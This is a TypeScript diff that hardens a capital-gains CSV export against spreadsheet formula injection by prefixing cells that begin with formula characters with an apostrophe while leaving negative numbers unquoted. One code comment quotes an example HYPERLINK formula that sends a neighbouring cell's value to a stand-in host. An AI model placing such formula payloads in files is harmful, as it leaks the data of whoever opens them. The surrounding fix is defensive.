@@ -132,9 +132,30 @@ export function capitalGainsByYear(events: LedgerEvent[], year: number): Capital
   };
 }
 
+/**
+ * Characters a spreadsheet reads as "this cell is a formula" when they lead it.
+ *
+ * Excel and LibreOffice both evaluate such a cell on open, and the values here
+ * are not ours — a holding's label is free text the reader typed. A label of
+ * `=HYPERLINK("http://example.invalid/?"&A1,"Total")` turns this file into an
+ * exfiltration of the row next to it the moment it is opened, which matters
+ * precisely because this export exists to be handed to someone else.
+ *
+ * Tab and carriage return are in the set because some versions strip leading
+ * whitespace and then evaluate whatever was behind it.
+ */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
+/** A plain number, which must never be quoted as text — every loss in this
+ * file leads with a minus sign, and an accountant's column has to still add up. */
+const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;
+
 function csvField(value: string | number): string {
-  const s = String(value);
-  return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
+  let s = String(value);
+  // A leading apostrophe is the spreadsheet convention for "treat as text". It
+  // is consumed on display, so the cell still reads as what was typed.
+  if (FORMULA_LEAD.test(s) && !PLAIN_NUMBER.test(s)) s = `'${s}`;
+  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
 
 function csvLine(fields: (string | number)[]): string {
